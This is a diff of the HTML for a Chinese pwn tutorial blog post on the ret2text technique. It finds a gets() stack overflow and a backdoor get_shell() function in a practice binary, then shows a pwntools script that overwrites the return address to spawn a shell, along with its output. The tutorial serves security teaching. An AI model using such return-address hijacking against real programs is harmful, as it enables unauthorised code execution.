@@ -12,7 +12,34 @@
 <meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='PWN' /><meta property='article:published_time' content='2022-02-10T22:54:20-05:00'/><meta property='article:modified_time' content='2022-02-10T22:54:20-05:00'/><meta property='og:image' content='https://blog.nanosec.site/p/pwn-pwn-pang-part4---ret2text/cover.jpg' />
 <meta name="twitter:title" content="PWN! PWN! PANG! Part4 --- ret2text">
 <meta name="twitter:description" content="诶，我从你家后门进去了哦～"><meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:image" content='https://blog.nanosec.site/p/pwn-pwn-pang-part4---ret2text/cover.jpg' />
+    <meta name="twitter:image" content='https://blog.nanosec.site/p/pwn-pwn-pang-part4---ret2text/cover.jpg' /><head>
+    <style>
+ .blur {
+   color: transparent;
+   text-shadow:0px 0px 8px rgba(0,0,0,0.5)
+}
+
+.blur:hover {
+   color: transparent;
+   text-shadow:0px 0px 0px rgba(0,0,0,1)
+
+}
+
+.shady {
+   color:#000;
+   font-weight: bold;
+   box-shadow: 0px -20px 0px rgba(0,0,0,1) inset; 
+   transition: all 0.3s ease;
+}
+.shady:hover{
+  font-weight: bold;
+   color:#FFF;
+   box-shadow: 0px -20px 0px rgba(0,0,0,1) inset; 
+}
+</style>
+</head>
+
+
     </head>
     <body class="
     article-page
@@ -440,20 +467,20 @@
 <p>确保ret2text文件可以执行</p>
 </li>
 </ul>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="ln">1</span><span class="cl">ll
-</span></span><span class="line"><span class="ln">2</span><span class="cl">chmod +x ret2text
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">ll
+</span></span><span class="line"><span class="cl">chmod +x ret2text
 </span></span></code></pre></div><h3 id="查看保护开启情况">查看保护开启情况</h3>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="ln">1</span><span class="cl">checksec ret2text
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">checksec ret2text
 </span></span></code></pre></div><blockquote>
 <p>至于checksec用法嘛= =    checksec 文件名</p>
 </blockquote>
 <p>结果</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="ln">1</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/kali/Sec/PWN/Stack/ret2text&#39;</span>
-</span></span><span class="line"><span class="ln">2</span><span class="cl">    Arch:     i386-32-little
-</span></span><span class="line"><span class="ln">3</span><span class="cl">    RELRO:    Partial RELRO
-</span></span><span class="line"><span class="ln">4</span><span class="cl">    Stack:    No canary found
-</span></span><span class="line"><span class="ln">5</span><span class="cl">    NX:       NX enabled
-</span></span><span class="line"><span class="ln">6</span><span class="cl">    PIE:      No PIE <span class="o">(</span>0x8048000<span class="o">)</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/kali/Sec/PWN/Stack/ret2text&#39;</span>
+</span></span><span class="line"><span class="cl">    Arch:     i386-32-little
+</span></span><span class="line"><span class="cl">    RELRO:    Partial RELRO
+</span></span><span class="line"><span class="cl">    Stack:    No canary found
+</span></span><span class="line"><span class="cl">    NX:       NX enabled
+</span></span><span class="line"><span class="cl">    PIE:      No PIE <span class="o">(</span>0x8048000<span class="o">)</span>
 </span></span></code></pre></div><p>可以看见这是一个32位程序，开启了NX</p>
 <h3 id="反汇编分析">反汇编分析</h3>
 <p>因为IDA是win平台的，所以我们就得先请出一只无辜的Windows</p>
@@ -514,31 +541,31 @@
 <p><strong>Tip: 别忘了Fn键哦.qaq</strong></p>
 </blockquote>
 <h3 id="思路分析">思路分析</h3>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="ln">1</span><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
-</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="ln">3</span><span class="cl">  <span class="n">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
-</span></span><span class="line"><span class="ln">4</span><span class="cl">  <span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
-</span></span><span class="line"><span class="ln">5</span><span class="cl">  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Have you heard of buffer overflow?&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="ln">6</span><span class="cl">  <span class="n">vulnerable</span><span class="p">();</span>
-</span></span><span class="line"><span class="ln">7</span><span class="cl">  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;It seems that you know nothing about it ......&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="ln">8</span><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-</span></span><span class="line"><span class="ln">9</span><span class="cl"><span class="p">}</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Have you heard of buffer overflow?&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">vulnerable</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;It seems that you know nothing about it ......&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><p>我们看到它调用了一个vulnerable函数  <strong><del>(这也太明显了吧 = = )</del></strong></p>
 <p>查看那个 <del>欠揍的函数</del> 代码，可以看见明显的一个漏洞</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="ln">1</span><span class="cl"><span class="kt">int</span> <span class="nf">vulnerable</span><span class="p">()</span>
-</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="ln">3</span><span class="cl">  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span> <span class="c1">// [esp+8h] [ebp-10h] BYREF
-</span></span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="c1"></span>
-</span></span><span class="line"><span class="ln">5</span><span class="cl">  <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
-</span></span><span class="line"><span class="ln">6</span><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-</span></span><span class="line"><span class="ln">7</span><span class="cl"><span class="p">}</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">vulnerable</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span> <span class="c1">// [esp+8h] [ebp-10h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><p>它使用<code>gets()</code>读入局部变量<code>buffer[8]</code>,由于<code>gets()</code>不检查输入长度，所以就可以读入过长数据造成栈溢出</p>
 <p>仔细观察左侧函数列表，<code>get_shell()</code>引起了我们的注意</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="ln">1</span><span class="cl"><span class="kt">int</span> <span class="nf">get_shell</span><span class="p">()</span>
-</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="ln">3</span><span class="cl">  <span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="ln">4</span><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-</span></span><span class="line"><span class="ln">5</span><span class="cl"><span class="p">}</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">get_shell</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><p>好家伙，直接双手呈上shell= =,</p>
 <p>这看起来是某个程序员为了方便自己 <del>奇奇怪怪的意图</del> 调试程序干的&lt;好&gt;事, 在程序了直接留下一个后门</p>
 <p>现在我们的思路应该很清晰了，就是通过栈溢出篡改函数返回地址，劫持程序执行流，让其调用<code>get_shell()</code></p>
@@ -579,18 +606,18 @@
 <li>通过IDA的注释获取(不一定准确)</li>
 </ul>
 <p>在IDA对于受害者函数的反编译代码中，有这样一句</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="ln">1</span><span class="cl"><span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span> <span class="c1">// [esp+8h] [ebp-10h] BYREF
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span> <span class="c1">// [esp+8h] [ebp-10h] BYREF
 </span></span></span></code></pre></div><p>可以看到buffer[8]距离<code>prev ebp</code>有16字节的距离，由于我们还需填充<code>prev ebp</code>,我们还要填充4字节的垃圾数据，一共20字节垃圾数据</p>
 <ul>
 <li>通过pwndbg动态调试</li>
 </ul>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">gdb ret2text
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">gdb ret2text
 </span></span></code></pre></div><p>由于我们要溢出的地方在函数<code>vulnerable()</code>,我们直接在那个地方打断点</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">b vulnerable
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">b vulnerable
 </span></span></code></pre></div><p>现在开始调试该程序</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">r
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">r
 </span></span></code></pre></div><p>一直下一步直到输入(虽说本次只需要一次)</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">n
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">n
 </span></span></code></pre></div><p>输入8个A测试一下</p>
 <p><img src="/p/pwn-pwn-pang-part4---ret2text/n.png"
 	width="1145"
@@ -607,22 +634,22 @@
 	
 ></p>
 <p>输入stack 大小(这个大小随意，最好大一些) 查看栈的情况</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">stack 40
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">stack 40
 </span></span></code></pre></div><p>结果</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="ln"> 1</span><span class="cl">pwndbg&gt; stack <span class="m">40</span>
-</span></span><span class="line"><span class="ln"> 2</span><span class="cl">00:0000│ esp 0xffffd070 ◂— 0x1
-</span></span><span class="line"><span class="ln"> 3</span><span class="cl">01:0004│     0xffffd074 —▸ 0x80483e0 <span class="o">(</span>_start<span class="o">)</span> ◂— xor    ebp, ebp
-</span></span><span class="line"><span class="ln"> 4</span><span class="cl">02:0008│ eax 0xffffd078 ◂— <span class="s1">&#39;AAAAAAAA&#39;</span>
-</span></span><span class="line"><span class="ln"> 5</span><span class="cl">03:000c│     0xffffd07c ◂— <span class="s1">&#39;AAAA&#39;</span>
-</span></span><span class="line"><span class="ln"> 6</span><span class="cl">04:0010│     0xffffd080 —▸ 0x8048600 <span class="o">(</span>__libc_csu_init+32<span class="o">)</span> ◂— dec    dword ptr <span class="o">[</span>ebp - 0xfb7d<span class="o">]</span>
-</span></span><span class="line"><span class="ln"> 7</span><span class="cl">05:0014│     0xffffd084 —▸ 0x804a000 <span class="o">(</span>_GLOBAL_OFFSET_TABLE_<span class="o">)</span> —▸ 0x8049f0c <span class="o">(</span>_DYNAMIC<span class="o">)</span> ◂— 0x1
-</span></span><span class="line"><span class="ln"> 8</span><span class="cl">06:0018│ ebp 0xffffd088 —▸ 0xffffd098 ◂— 0x0
-</span></span><span class="line"><span class="ln"> 9</span><span class="cl">07:001c│     0xffffd08c —▸ 0x80485ae <span class="o">(</span>main+93<span class="o">)</span> ◂— sub    esp, 0xc
-</span></span><span class="line"><span class="ln">10</span><span class="cl">08:0020│     0xffffd090 —▸ 0xffffd0b0 ◂— 0x1
-</span></span><span class="line"><span class="ln">11</span><span class="cl">09:0024│     0xffffd094 ◂— 0x0
-</span></span><span class="line"><span class="ln">12</span><span class="cl">0a:0028│     0xffffd098 ◂— 0x0
-</span></span><span class="line"><span class="ln">13</span><span class="cl">0b:002c│     0xffffd09c —▸ 0xf7dd9905 <span class="o">(</span>__libc_start_main+229<span class="o">)</span> ◂— add    esp, 0x10
-</span></span><span class="line"><span class="ln">14</span><span class="cl">0c:0030│     0xffffd0a0 ◂— 0x1
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">pwndbg&gt; stack <span class="m">40</span>
+</span></span><span class="line"><span class="cl">00:0000│ esp 0xffffd070 ◂— 0x1
+</span></span><span class="line"><span class="cl">01:0004│     0xffffd074 —▸ 0x80483e0 <span class="o">(</span>_start<span class="o">)</span> ◂— xor    ebp, ebp
+</span></span><span class="line"><span class="cl">02:0008│ eax 0xffffd078 ◂— <span class="s1">&#39;AAAAAAAA&#39;</span>
+</span></span><span class="line"><span class="cl">03:000c│     0xffffd07c ◂— <span class="s1">&#39;AAAA&#39;</span>
+</span></span><span class="line"><span class="cl">04:0010│     0xffffd080 —▸ 0x8048600 <span class="o">(</span>__libc_csu_init+32<span class="o">)</span> ◂— dec    dword ptr <span class="o">[</span>ebp - 0xfb7d<span class="o">]</span>
+</span></span><span class="line"><span class="cl">05:0014│     0xffffd084 —▸ 0x804a000 <span class="o">(</span>_GLOBAL_OFFSET_TABLE_<span class="o">)</span> —▸ 0x8049f0c <span class="o">(</span>_DYNAMIC<span class="o">)</span> ◂— 0x1
+</span></span><span class="line"><span class="cl">06:0018│ ebp 0xffffd088 —▸ 0xffffd098 ◂— 0x0
+</span></span><span class="line"><span class="cl">07:001c│     0xffffd08c —▸ 0x80485ae <span class="o">(</span>main+93<span class="o">)</span> ◂— sub    esp, 0xc
+</span></span><span class="line"><span class="cl">08:0020│     0xffffd090 —▸ 0xffffd0b0 ◂— 0x1
+</span></span><span class="line"><span class="cl">09:0024│     0xffffd094 ◂— 0x0
+</span></span><span class="line"><span class="cl">0a:0028│     0xffffd098 ◂— 0x0
+</span></span><span class="line"><span class="cl">0b:002c│     0xffffd09c —▸ 0xf7dd9905 <span class="o">(</span>__libc_start_main+229<span class="o">)</span> ◂— add    esp, 0x10
+</span></span><span class="line"><span class="cl">0c:0030│     0xffffd0a0 ◂— 0x1
 </span></span></code></pre></div><p>可以看到A们在地址<code>0xffffd078</code>,而<code>prev ebp</code>的地址是<code>0xffffd088</code></p>
 <blockquote>
 <p>Tip: 0x表示16进制</p>
@@ -662,77 +689,77 @@
 <li>利用PWNTools</li>
 </ul>
 <p>别忘了python导入模块</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="ln">1</span><span class="cl">┌──<span class="o">(</span>kira㉿kali<span class="o">)</span>-<span class="o">[</span>~/Sec/PWN/Stack<span class="o">]</span>
-</span></span><span class="line"><span class="ln">2</span><span class="cl">└─$ python                 
-</span></span><span class="line"><span class="ln">3</span><span class="cl">Python 3.9.10 <span class="o">(</span>main, Jan <span class="m">16</span> 2022, 17:12:18<span class="o">)</span> 
-</span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="o">[</span>GCC 11.2.0<span class="o">]</span> on linux
-</span></span><span class="line"><span class="ln">5</span><span class="cl">Type <span class="s2">&#34;help&#34;</span>, <span class="s2">&#34;copyright&#34;</span>, <span class="s2">&#34;credits&#34;</span> or <span class="s2">&#34;license&#34;</span> <span class="k">for</span> more information.
-</span></span><span class="line"><span class="ln">6</span><span class="cl">&gt;&gt;&gt; from pwn import *
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>kira㉿kali<span class="o">)</span>-<span class="o">[</span>~/Sec/PWN/Stack<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ python                 
+</span></span><span class="line"><span class="cl">Python 3.9.10 <span class="o">(</span>main, Jan <span class="m">16</span> 2022, 17:12:18<span class="o">)</span> 
+</span></span><span class="line"><span class="cl"><span class="o">[</span>GCC 11.2.0<span class="o">]</span> on linux
+</span></span><span class="line"><span class="cl">Type <span class="s2">&#34;help&#34;</span>, <span class="s2">&#34;copyright&#34;</span>, <span class="s2">&#34;credits&#34;</span> or <span class="s2">&#34;license&#34;</span> <span class="k">for</span> more information.
+</span></span><span class="line"><span class="cl">&gt;&gt;&gt; from pwn import *
 </span></span></code></pre></div><p>加载该ELF文件信息</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="n">elf</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;ret2text&#34;</span><span class="p">)</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">elf</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;ret2text&#34;</span><span class="p">)</span>
 </span></span></code></pre></div><p>寻找<code>get_shell()</code>函数地址</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="n">get_shell</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;get_shell&#34;</span><span class="p">]</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">get_shell</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;get_shell&#34;</span><span class="p">]</span>
 </span></span></code></pre></div><p>现在，get_shell变量就保存着<code>get_shell()</code>函数地址了</p>
 <hr>
 <h3 id="exploit">Exploit!</h3>
 <p>呼～终于到了攻击的时候</p>
 <p>攻击前，先运行程序试一试</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="ln">1</span><span class="cl">./ret2text
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">./ret2text
 </span></span></code></pre></div><p>输入可以随便写点什么(我这里写一个A)</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="ln">1</span><span class="cl">┌──<span class="o">(</span>kira㉿kali<span class="o">)</span>-<span class="o">[</span>~/Sec/PWN/Stack<span class="o">]</span>
-</span></span><span class="line"><span class="ln">2</span><span class="cl">└─$ ./ret2text                       
-</span></span><span class="line"><span class="ln">3</span><span class="cl">Have you heard of buffer overflow?
-</span></span><span class="line"><span class="ln">4</span><span class="cl">A 
-</span></span><span class="line"><span class="ln">5</span><span class="cl">It seems that you know nothing about it ......
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>kira㉿kali<span class="o">)</span>-<span class="o">[</span>~/Sec/PWN/Stack<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ ./ret2text                       
+</span></span><span class="line"><span class="cl">Have you heard of buffer overflow?
+</span></span><span class="line"><span class="cl">A 
+</span></span><span class="line"><span class="cl">It seems that you know nothing about it ......
 </span></span></code></pre></div><p>嘛。。这小程序说我们不会缓冲区溢出。。现在就证明给它看我们会！（</p>
 <p>先建一个攻击脚本</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="ln">1</span><span class="cl">vi exp_ret2text.py
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">vi exp_ret2text.py
 </span></span></code></pre></div><p>第一件事情嘛= =，当然是导入pwntools模块</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span></code></pre></div><p>然后就是基本操作</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./ret2text&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./ret2text&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
 </span></span></code></pre></div><p>构造payload(要输入的东西，也就是垃圾数据和我们想要程序返回的地址)</p>
 <p>如果你用IDA取地址(不建议)</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">20</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x08048522</span><span class="p">)</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">20</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x08048522</span><span class="p">)</span>
 </span></span></code></pre></div><p>如果你用pwntools取地址(你可以直接在编写脚本的时候取地址)</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="n">elf</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;ret2text&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="n">get_shell</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbol</span><span class="p">[</span><span class="s2">&#34;get_shell&#34;</span><span class="p">]</span>
-</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">20</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">get_shell</span><span class="p">)</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">elf</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;ret2text&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">get_shell</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbol</span><span class="p">[</span><span class="s2">&#34;get_shell&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">20</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">get_shell</span><span class="p">)</span>
 </span></span></code></pre></div><p>最后，把恶意数据喂给程序 <del>唔哈哈哈哈;)</del></p>
 <p>就能尽情享用得到的shell了</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </span></span></code></pre></div><h3 id="运行攻击脚本">运行攻击脚本</h3>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="ln">1</span><span class="cl">python3 exp_ret2text.py
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">python3 exp_ret2text.py
 </span></span></code></pre></div><p>过程展示</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="ln"> 1</span><span class="cl">┌──<span class="o">(</span>kira㉿kali<span class="o">)</span>-<span class="o">[</span>~/Sec/PWN/Stack<span class="o">]</span>
-</span></span><span class="line"><span class="ln"> 2</span><span class="cl">└─$ python3 exp_ret2text.py                                                       
-</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="o">[</span>+<span class="o">]</span> Starting <span class="nb">local</span> process <span class="s1">&#39;./ret2text&#39;</span>: pid <span class="m">897972</span>
-</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/kali/Sec/PWN/Stack/ret2text&#39;</span>
-</span></span><span class="line"><span class="ln"> 5</span><span class="cl">    Arch:     i386-32-little
-</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    RELRO:    Partial RELRO
-</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    Stack:    No canary found
-</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    NX:       NX enabled
-</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    PIE:      No PIE <span class="o">(</span>0x8048000<span class="o">)</span>
-</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> Switching to interactive mode
-</span></span><span class="line"><span class="ln">11</span><span class="cl">$ ls
-</span></span><span class="line"><span class="ln">12</span><span class="cl">exp_ret2text.py  pwndbg  ret2libc1  ret2libc2  ret2text
-</span></span><span class="line"><span class="ln">13</span><span class="cl">$ whoami
-</span></span><span class="line"><span class="ln">14</span><span class="cl">kira
